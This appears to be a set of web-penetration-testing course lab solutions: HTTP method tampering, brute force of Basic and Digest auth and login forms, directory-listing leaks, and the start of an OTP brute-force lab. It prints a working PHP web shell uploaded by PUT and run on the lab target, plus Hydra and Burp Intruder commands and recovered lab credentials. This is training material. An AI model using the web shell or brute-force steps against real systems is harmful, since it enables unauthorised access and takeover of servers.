# Testing for Common Attacks

The ability to thoroughly assess and test a web application for common misconfigurations and vulnerabilities will mark you out as a good web application penetration tester. Common attacks and vulnerabilities usually get overlooked by web application penetration testers, and as a result, these vulnerabilities are missed during assessments or pentests. It is imperative to factor common vulnerabilities into a penetration test to ensure that a client or organization has a strong foundation to build on.

This course is designed to equip you with the knowledge and skills needed to identify and exploit common misconfigurations and vulnerabilities in web applications. This course will delve deep into the intricacies of HTTP method tampering, attacking basic HTTP authentication, HTTP digest authentication, session hijacking, and Cross-Site Request Forgery (CSRF) to provide you with the knowledge and skills required to operate effectively as a web app pentester and improve your ability to perform thorough and comprehensive web application security testing.

---

## Course Introduction

### Course Topic Overview

- HTTP Method and Authentication Testing
- Sensitive Data Exposure
- Broken Authentication Attacks (Attacking Login Forms, Bypassing Authentication, etc.)
- Session Security Testing (Session Hijacking, Session Fixation and CSRF)
- Injection and Input Validation Attacks (Command Injection, Code Injection)
- Testing For Security Misconfigurations
- Exploiting Vulnerable and Outdated Components

### Prerequisites

- Basic familiarity with HTTP
- Basic Familiarity With Burp Suite/OWASP ZAP
- Basic familiarity with Linux

### Learning Objectives

- You will be able to perform HTTP method tampering.
- You have the ability to attack sites using Basic HTTP Authentication and HTTP Digest Authentication.
- You will have an understanding of what causes sensitive data exposure vulnerabilities.
- You will have the ability to perform authentication testing in the form of attacking login forms and bypassing authentication.
- You will have an understanding of how session management works and the role tokens and cookies play in session management and security.
- You will be able to identify and exploit session hijacking, session fixation and CSRF vulnerabilities.
- You will be able to identify and exploit command injection and code injection vulnerabilities.
- You will be able to identify and exploit security misconfigurations in web servers and other outdated and vulnerable components.

---
---

## HTTP Method and Authentication Testing

### HTTP Method Tampering

#### Lab Environment

**HTTP Method Enumeration**

This lab focuses on enumerating and testing HTTP methods on a web server. You will learn to interact with various web pages of the application to discover supported HTTP methods and explore the potential for unauthorized actions like file uploads and deletions.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at `demo.ine.local`.

**Objective:** To understand and identify the HTTP methods supported by different web pages within a web application

#### Lab Solution

`curl -v -X GET http://demo.ine.local/`:
```http
* Host demo.ine.local:80 was resolved.
* IPv6: (none)
* IPv4: 192.48.93.3
*   Trying 192.48.93.3:80...
* Connected to demo.ine.local (192.48.93.3) port 80
> GET / HTTP/1.1 📌
> Host: demo.ine.local
> User-Agent: curl/8.8.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Wed, 27 Nov 2024 12:16:10 GMT
< Server: Apache
< X-Powered-By: PHP/5.5.9-1ubuntu4.25
< Set-Cookie: PHPSESSID=4ta6vq3fqm7b2q5l60qq3sgo10; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Vary: Accept-Encoding
< Content-Length: 4408
< Content-Type: text/html
< 

<!DOCTYPE html>
<html lang="en">

[...]
```

`curl -v -X POST http://demo.ine.local/`:
```http
* Host demo.ine.local:80 was resolved.
* IPv6: (none)
* IPv4: 192.48.93.3
*   Trying 192.48.93.3:80...
* Connected to demo.ine.local (192.48.93.3) port 80
> POST / HTTP/1.1 📌
> Host: demo.ine.local
> User-Agent: curl/8.8.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 405 Method Not Allowed
< Date: Wed, 27 Nov 2024 12:17:04 GMT
< Server: Apache
< X-Powered-By: PHP/5.5.9-1ubuntu4.25
< Set-Cookie: PHPSESSID=b5kvvd3qbrj6qb9jn4jj842636; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Content-Length: 222
< Content-Type: text/html
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>405 Method Not Allowed</title> 📌
</head><body>
<h1>Method Not Allowed</h1>
<p>The requested method POST is not allowed for the URL /.</p>
</body></html>
* Connection #0 to host demo.ine.local left intact
```

`curl -v -X OPTIONS http://demo.ine.local/`:
```http
* Host demo.ine.local:80 was resolved.
* IPv6: (none)
* IPv4: 192.48.93.3
*   Trying 192.48.93.3:80...
* Connected to demo.ine.local (192.48.93.3) port 80
> OPTIONS / HTTP/1.1 📌
> Host: demo.ine.local
> User-Agent: curl/8.8.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Wed, 27 Nov 2024 12:18:21 GMT
< Server: Apache
< X-Powered-By: PHP/5.5.9-1ubuntu4.25
< Set-Cookie: PHPSESSID=n4d8jccrmm7gop07nvfe7a1vt0; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< Allow: GET,HEAD,OPTIONS 📌
< Content-Length: 0
< Content-Type: text/html
< 
* Connection #0 to host demo.ine.local left intact
```

`dirb http://demo.ine.local`:
```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Nov 27 17:35:54 2024
URL_BASE: http://demo.ine.local/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://demo.ine.local/ ----
+ http://demo.ine.local/.git/HEAD (CODE:200|SIZE:23)
+ http://demo.ine.local/cgi-bin/ (CODE:403|SIZE:210)
==> DIRECTORY: http://demo.ine.local/css/
==> DIRECTORY: http://demo.ine.local/img/
+ http://demo.ine.local/index.php (CODE:200|SIZE:4408)
==> DIRECTORY: http://demo.ine.local/js/
+ http://demo.ine.local/LICENSE (CODE:200|SIZE:10273)
==> DIRECTORY: http://demo.ine.local/mail/
+ http://demo.ine.local/phpinfo.php (CODE:200|SIZE:74363)
+ http://demo.ine.local/server-status (CODE:403|SIZE:215)
==> DIRECTORY: http://demo.ine.local/uploads/ 📌
==> DIRECTORY: http://demo.ine.local/vendor/

---- Entering directory: http://demo.ine.local/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://demo.ine.local/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://demo.ine.local/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://demo.ine.local/mail/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://demo.ine.local/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://demo.ine.local/vendor/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Wed Nov 27 17:35:55 2024
DOWNLOADED: 4612 - FOUND: 6
```

`curl -v -X OPTIONS http://demo.ine.local/uploads/`:
```http
* Host demo.ine.local:80 was resolved.
* IPv6: (none)
* IPv4: 192.48.93.3
*   Trying 192.48.93.3:80...
* Connected to demo.ine.local (192.48.93.3) port 80
> OPTIONS /uploads/ HTTP/1.1
> Host: demo.ine.local
> User-Agent: curl/8.8.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Wed, 27 Nov 2024 12:18:53 GMT
< Server: Apache
< DAV: 1,2
< DAV: <http://apache.org/dav/propset/fs/1>
< MS-Author-Via: DAV
< Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,LOCK,UNLOCK 📌
< Content-Length: 0
< Content-Type: httpd/unix-directory
< 
* Connection #0 to host demo.ine.local left intact
```

`locate -i 'webshells' | grep -E '\.php$'`:
```
/usr/share/webshells/php/php-backdoor.php
/usr/share/webshells/php/php-reverse-shell.php
/usr/share/webshells/php/qsd-php-backdoor.php
/usr/share/webshells/php/simple-backdoor.php
/usr/share/webshells/php/findsocket/php-findsock-shell.php
```

`cp /usr/share/webshells/php/simple-backdoor.php ./shell.php`

`cat ./shell.php`:
```php
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
```

`curl -X PUT http://demo.ine.local/uploads/ --upload-file ./shell.php`:
```html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>
```

`curl -X GET http://demo.ine.local/uploads/`:
```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /uploads</title>
 </head>
 <body>
<h1>Index of /uploads</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="shell.php">shell.php</a></td><td align="right">2024-11-27 12:25  </td><td align="right">328 </td><td>&nbsp;</td></tr> 📌
   <tr><th colspan="5"><hr></th></tr>
</table>
</body></html>
```

`curl http://demo.ine.local/uploads/shell.php?cmd=id`:
```html
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre> 🚩
```

`curl -X DELETE http://demo.ine.local/uploads/shell.php`

### Attacking HTTP Basic Authentication

#### Lab Environment

**Attacking HTTP Basic Authentication with Burp Suite**

Web Application Pentesting Tools can prove to be very helpful while performing penetration testing. 

In this lab exercise, we will take a look at how to use [Burp Suite](https://portswigger.net/support/burp-suite-tools) to perform a dictionary attack on HTTP Basic authentication protected directories.

**Objective**: Perform Dictionary Attack on the password-protected directory `/basic`.

Instructions: 
- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a Kali GUI instance.
- Your Kali instance has an interface with IP address `192.X.Y.2`. Run `ip addr` to know the values of X and Y.
- Do not attack the gateway located at IP address `192.X.Y.1`.
- HTTP Authentication username is "admin".
- For dictionary attack, use the password wordlist: `/root/Desktop/wordlists/100-common-passwords.txt`.

#### Lab Solution

`ifconfig eth1`:
```
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.76.240.2 📌 netmask 255.255.255.0  broadcast 192.76.240.255
        ether 02:42:c0:4c:f0:02  txqueuelen 0  (Ethernet)
        RX packets 17  bytes 1446 (1.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

![Lab - Attacking HTTP Basic Authentication with Burp Suite](./assets/testing_for_common_attacks_lab_attacking_http_basic_authentication_with_burp_suite.png)

`burpsuite` > `Repeater`

`HTTP Request`:
```http
GET /basic HTTP/1.1
Host: 192.76.240.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=freol24712nvgt9hf2lg42m5p2
Upgrade-Insecure-Requests: 1
```
`HTTP Response`:
```http
HTTP/1.1 401 Unauthorized
Date: Wed, 27 Nov 2024 12:41:03 GMT
Server: Apache/2.4.7 (Ubuntu)
WWW-Authenticate: Basic realm="private" 📌
Content-Length: 458
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.7 (Ubuntu) Server at 192.76.240.3 Port 80</address>
</body></html>
```

`burpsuite` > `Proxy`

`HTTP Request`:
```http
GET /basic HTTP/1.1
Host: 192.76.240.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=freol24712nvgt9hf2lg42m5p2
Upgrade-Insecure-Requests: 1
Authorization: Basic dGVzdDp0ZXN0 📌
```

`echo -n 'dGVzdDp0ZXN0' | base64 -d`:
```
test:test
```

`burpsuite` > `Intruder` > `Payloads` = `Payload Options: Load: /root/Desktop/wordlists/100-common-passwords.txt` = `Payload Processing: Add: Add Prefix: admin:` = `Payload Processing: Add: Base64-encode`> `Start attack`

`HTTP Request`:
```http
GET /basic HTTP/1.1
Host: 192.76.240.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=freol24712nvgt9hf2lg42m5p2
Upgrade-Insecure-Requests: 1
Authorization: Basic §password§
```
`HTTP Request`:
```http
GET /basic HTTP/1.1
Host: 192.76.240.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=freol24712nvgt9hf2lg42m5p2
Upgrade-Insecure-Requests: 1
Authorization: Basic YWRtaW46Y29va2llMQ%3d%3d 📌
```
`HTTP Response`:
```http
HTTP/1.1 301 Moved Permanently 📌
Date: Wed, 27 Nov 2024 13:15:23 GMT
Server: Apache/2.4.7 (Ubuntu)
Location: http://192.76.240.3/basic/
Content-Length: 311
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://192.76.240.3/basic/">here</a>.</p>
<hr>
<address>Apache/2.4.7 (Ubuntu) Server at 192.76.240.3 Port 80</address>
</body></html>
```

`burpsuite` > `Decoder`

`Input`:
```
YWRtaW46Y29va2llMQ%3d%3d
```
`Decode as: URL`:
```
YWRtaW46Y29va2llMQ==
```
`Decode as: Base64`:
```
admin:cookie1 🔑
```

### Attacking HTTP Digest Authentication

#### Lab Environment

**Attacking HTTP Digest Authentication with Hydra**

Web Application Pentesting Tools can prove to be very helpful while performing penetration testing. 

In this lab exercise, we will take a look at how to use [hydra](https://github.com/vanhauser-thc/thc-hydra) to perform a dictionary attack on HTTP authentication protected directories.

**Objective**: Perform Dictionary Attack on password-protected directory `/basic` and `/digest`.

Instructions: 
- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a Kali GUI instance.
- Your Kali instance has an interface with IP address `192.X.Y.2`. Run `ip addr` to know the values of X and Y.
- Do not attack the gateway located at IP address `192.X.Y.1`.
- HTTP Authentication username is "admin".
- For dictionary attack, use the password wordlist: `/root/Desktop/wordlists/100-common-passwords.txt`.

#### Lab Solution

`ifconfig eth1`:
```
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.208.248.2 📌 netmask 255.255.255.0  broadcast 192.208.248.255
        ether 02:42:c0:d0:f8:02  txqueuelen 0  (Ethernet)
        RX packets 15  bytes 1306 (1.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

![Lab - Attacking HTTP Digest Authentication with Hydra](./assets/testing_for_common_attacks_lab_attacking_http_digest_authentication_with_hydra.png)

`burpsuite` > `Proxy`

`HTTP Request`:
```http
GET /digest/ HTTP/1.1
Host: 192.208.248.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=gbrcvk76tf3s352m0jtv2140e5
Upgrade-Insecure-Requests: 1
Authorization: Digest username="test", realm="Private", nonce="ohX4B+UnBgA=79534fad29d28769f505132a196ee1be8ee5e6ec", uri="/digest/", algorithm=MD5, response="32d47cc70550372817022ba32099cadb", qop=auth, nc=00000001, cnonce="b25d92b8eb924ca3" 📌
```

`hydra -l 'admin' -P /root/Desktop/wordlists/100-common-passwords.txt 192.208.248.3 http-get /digest/`:
```
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-27 19:09:41
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:1/p:100), ~7 tries per task
[DATA] attacking http-get://192.208.248.3:80/digest/
[80][http-get] host: 192.208.248.3   login: admin   password: adminpasswd 🔑
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-27 19:09:43
```

---

## Sensitive Data Exposure

### Sensitive Data Exposure Vulnerabilities

#### Lab Environment

**Vulnerable Apache III**

Apache is probably the most popular web server on the World Wide Web with millions of deployments! In this series of challenges, we hope to explore how attackers can exploit webapps running on Apache  arising due to server misconfigurations and/or application vulnerabilities. Take a look at the scenario below.

The target server is hosting a web app. The web app is not vulnerable but the directory listing enabled on the server. And, that can lead to sensitive information leakage.

**Objective**: Your objective is to login into the webapp as 'admin' user and retrieve the flag!

#### Lab Solution

`dirb https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/ /usr/share/wordlists/dirb/small.txt`:
```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Nov 27 14:44:58 2024
URL_BASE: https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/
WORDLIST_FILES: /usr/share/wordlists/dirb/small.txt

-----------------

GENERATED WORDS: 959                                                           

---- Scanning URL: https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/ ----
+ https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/cgi-bin/ (CODE:403|SIZE:340)                                                                                   
+ https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/composer (CODE:200|SIZE:403)                                                                                   
==> DIRECTORY: https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/docs/                                                                                             
+ https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/logo (CODE:200|SIZE:14598)                                                                                     
==> DIRECTORY: https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/public/ 📌                                                                                        
---- Entering directory: https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/docs/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/public/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it. 📌                       
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Wed Nov 27 14:45:41 2024
DOWNLOADED: 959 - FOUND: 3
```

`nikto -h https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/`:
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          172.104.229.221
+ Target Hostname:    x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /CN=eu-central-5.attackdefensecloudlabs.com
                   Ciphers:  TLS_AES_256_GCM_SHA384
                   Issuer:   /C=US/O=Let's Encrypt/CN=R11
+ Start Time:         2024-11-27 14:45:23 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ /: Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.26.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The site uses TLS and the Strict-Transport-Security HTTP header is not defined. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the secure flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: The Content-Encoding header is set to "deflate" which may mean that the server is vulnerable to the BREACH attack. See: http://breachattack.com/
+ Hostname 'x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com' does not match certificate's names: eu-central-5.attackdefensecloudlabs.com. See: https://cwe.mitre.org/data/definitions/297.html
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /phpinfo.php: Output from the phpinfo() function was found.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ /public/: Directory indexing found. 📌
+ /public/: This might be interesting.

[...]
```

`curl -s https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/public/`:
```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /public</title>
 </head>
 <body>
<h1>Index of /public</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/script.gif" alt="[   ]"></td><td><a href="cred.conf">cred.conf</a></td><td align="right">2018-08-25 10:59  </td><td align="right"> 56 </td><td>&nbsp;</td></tr> 📌
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="themes/">themes/</a></td><td align="right">2018-07-20 18:02  </td><td align="right">  - </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.7 (Ubuntu) Server at x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com Port 80</address>
</body></html>
```

`curl -s https://x98om58h6103o8tnmyurp1okd.eu-central-5.attackdefensecloudlabs.com/public/cred.conf`:
```html
url="?/admin/login"
user:admin
password:$k@d00$#@123456 🔑
```

---

## Broken Authentication

### Attacking Login Forms with Burp Suite

#### Lab Environment

**Vulnerable Bank Portal: Dictionary Attack**

[OWASP Top 10](https://owasp.org/www-project-top-ten/) is an awareness document, which outlines the most critical security risks to web applications. Pentesting is performed according to the OWASP TOP 10 standard to reduce/mitigate the security risks.

In the exercise, we will focus on [OWASP A2 Broken Authentication](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication) flaws and we will take a look at how to leverage the broken authentication vulnerability on a single page web application.

**Objective**: Leverage the broken authentication vulnerability and access the administrative portal.

Instructions: 
- This lab is dedicated to you! No other users are on this network :)
- Once you start the lab, you will have access to a Kali GUI instance.
- Your Kali instance has an interface with IP address `192.X.Y.2`. Run `ip addr` to know the values of X and Y.
- Email ID to perform dictionary attack: "admin@secbank.com".
- For dictionary attack, use the password wordlist: `/root/Desktop/wordlists/100-common-passwords.txt`.
- Do not attack the gateway located at IP address `192.X.Y.1`.

#### Lab Solution

`ifconfig eth1`:
```
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.141.40.2 📌 netmask 255.255.255.0  broadcast 192.141.40.255
        ether 02:42:c0:8d:28:02  txqueuelen 0  (Ethernet)
        RX packets 143  bytes 589073 (575.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 131  bytes 14573 (14.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

![Lab - Vulnerable Bank Portal: Dictionary Attack](./assets/testing_for_common_attacks_lab_vulnerable_bank_portal_dictionary_attack.png)

`burpsuite` > `Proxy`

`HTTP Request`:
```http
POST /login HTTP/1.1
Host: 192.141.40.3:8000 📌
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://secure-bank.com:5000/login
Content-Type: application/json
Content-Length: 47
Origin: http://secure-bank.com:5000
Connection: close

{"email":"admin@secbank.com","password":"TEST"} 📌
```

`burpsuite` > `Intruder` > `Payloads` = `Load: /root/Desktop/wordlists/100-common-passwords.txt` > `Start attack`

`HTTP Request`:
```http
POST /login HTTP/1.1
Host: 192.141.40.3:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://secure-bank.com:5000/login
Content-Type: application/json
Content-Length: 52
Origin: http://secure-bank.com:5000
Connection: close

{"email":"admin@secbank.com","password":"§password§"}
```
`HTTP Request`:
```http
POST /login HTTP/1.1
Host: 192.141.40.3:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://secure-bank.com:5000/login
Content-Type: application/json
Content-Length: 52
Origin: http://secure-bank.com:5000
Connection: close

{"email":"admin@secbank.com","password":"christmas"} 🔑
```
`HTTP Response`:
```http
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 284
Access-Control-Allow-Origin: http://secure-bank.com:5000
Vary: Origin
Server: Werkzeug/1.0.1 Python/2.7.17
Date: Wed, 27 Nov 2024 14:13:05 GMT

{"admin": true, "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzZWN1cmUtcG9ydGFsIiwiYWRtaW4iOnRydWUsImVtYWlsIjoiYWRtaW5Ac2VjYmFuay5jb20iLCJleHAiOjE3MzI3MTg1ODUsImlhdCI6MTczMjcxNjc4NX0.7KI_knayZjXzlfS2pivBWHYL6adMhhZfMsVduFbj3Oc", "flag": "08357d4a0acc2687422ba06c7d696758"}
```

### Attacking Login Forms with OTP Security

#### Lab Environment

**Unlimited Attempts**

Over the past few years, web application developers have migrated from traditional architecture to API-driven architecture.  The authentication, authorization, sensitive data, etc are being handled by APIs these days. A misconfiguration or a vulnerability is all an attacker needs to do significant damage.

In this lab, we will take a look at how the lack of rate-limiting could be leveraged to perform brute force attacks and bypass authentication.

**Objective**: Brute force the 4 digit one-time password and bypass the authentication. 

URL: `https://zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com/dev`.

#### Lab Solution

![Lab - Unlimited Attempts](./assets/testing_for_common_attacks_lab_unlimited_attempts.png)

`burpsuite` > `Proxy`

`HTTP Request`:
```http
POST /dev/verify HTTP/1.1 📌
Host: zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 165
Origin: https://zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com
Connection: close
Referer: https://zl6h2bz2yh.execute-api.ap-southeast-1.amazonaws.com/dev
Cookie: SESSIONID=Z0FBQUFBQm5SeXNyVC1yNXpRSF95dlY2ZjlDNHNxcUs3a0tnQjVZNk5ITWF2NjB6N000c2NEcV9BbVhhVGxHMWtZaFNtYy13Tmx2S3VMcjUwU1lvU0pFQ1djMHNtRnQ2VUE9PQ==

{"sessionid":"Z0FBQUFBQm5SeXNyVC1yNXpRSF95dlY2ZjlDNHNxcUs3a0tnQjVZNk5ITWF2NjB6N000c2NEcV9BbVhhVGxHMWtZaFNtYy13Tmx2S3VMcjUwU1lvU0pFQ1djMHNtRnQ2VUE9PQ==","otp":"1234"} 📌
```

